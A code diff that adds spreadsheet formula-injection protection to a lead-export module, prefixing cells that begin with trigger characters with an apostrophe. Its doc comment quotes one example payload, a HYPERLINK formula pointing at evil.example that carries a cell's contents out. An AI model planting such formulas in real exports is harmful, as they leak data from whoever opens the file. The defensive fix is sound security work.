@@ -90,11 +90,79 @@ const PRINT_COLUMNS: Array<{
 
 export const EXPORT_COLUMN_HEADERS = COLUMNS.map((column) => column.header);
 
-/** Rows as plain objects, in column order — what CSV and XLSX both consume. */
+/* ========================================================================== *
+ * Spreadsheet formula injection
+ * ========================================================================== */
+
+/**
+ * The characters that make a spreadsheet treat a cell as code rather than text.
+ *
+ * `=` is the obvious one; `+`, `-` and `@` all begin a formula in Excel, and a
+ * leading TAB or CR is stripped on the way in, which puts whichever of the
+ * first four follows it back at the start of the cell.
+ */
+const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);
+
+/**
+ * A cell value that a spreadsheet cannot mistake for a formula.
+ *
+ * ---------------------------------------------------------------------------
+ * The exposure this closes
+ * ---------------------------------------------------------------------------
+ * Almost everything in a lead row is text somebody else wrote: the business
+ * name and address come from the scraper, and `notes` is free text typed into
+ * the portal. A lead called `=HYPERLINK("https://evil.example/"&A2,"Click")`
+ * exports as a live formula, and the person it runs on is an administrator
+ * opening the export on their own machine — the classic CSV injection, where
+ * the vulnerable application is the spreadsheet and the file is the payload.
+ * Excel's macro and DDE prompts are the last line of defence, and they are a
+ * dialog box a busy person clicks through.
+ *
+ * ---------------------------------------------------------------------------
+ * The fix, and where it is *not*
+ * ---------------------------------------------------------------------------
+ * A leading apostrophe, which every spreadsheet reads as "the rest of this cell
+ * is text". It is applied here, at the point rows are shaped for a file, and
+ * nowhere near the database: the stored lead is not modified, the worklist and
+ * the lead page still render exactly what was scraped or typed, and re-importing
+ * an export is unaffected (`parseLeadsCsv` reads the apostrophe as part of a
+ * name, which is a cosmetic difference in a file nobody re-imports, not a lost
+ * row).
+ *
+ * Values that do not begin with a trigger are returned byte-for-byte — `John
+ * Smith` and `123 Main Street` come out as themselves.
+ *
+ * A negative number *is* rewritten (`-10` becomes `'-10`), and that is the
+ * rule working rather than misfiring. There is no column here where a lead
+ * legitimately carries a leading `-` or `+`: ratings are 0–5, the only numeric
+ * column, and phone numbers in this database are `(415) 555-0182`. Special-casing
+ * "looks like a number" would mean deciding on every export whether
+ * `+1-415-555-0182` is a phone number or the subtraction Excel will evaluate it
+ * as, and getting that judgement wrong once is the whole vulnerability back.
+ */
+export function neutraliseFormula(value: string): string {
+  if (value === "") return value;
+  return FORMULA_TRIGGERS.has(value.charAt(0)) ? `'${value}` : value;
+}
+
+/**
+ * Rows as plain objects, in column order — what CSV and XLSX both consume.
+ *
+ * Every cell goes through {@link neutraliseFormula} here, in the one shared
+ * shaping step, so the two data formats cannot disagree about it and a column
+ * added to `COLUMNS` later is covered without anyone remembering to cover it.
+ * The headers are this file's own constants and are not passed through: they
+ * are not attacker-controlled, and quoting them would put an apostrophe in
+ * front of every column title.
+ *
+ * The PDF does not come through here. It has its own `PRINT_COLUMNS` and draws
+ * text onto a page — there is no cell for a formula to live in, and nothing
+ * about that output changes.
+ */
 export function toExportRows(leads: Lead[]): Array<Record<string, string>> {
   return leads.map((lead) => {
     const row: Record<string, string> = {};
-    for (const column of COLUMNS) row[column.header] = column.value(lead);
+    for (const column of COLUMNS) row[column.header] = neutraliseFormula(column.value(lead));
     return row;
   });
 }
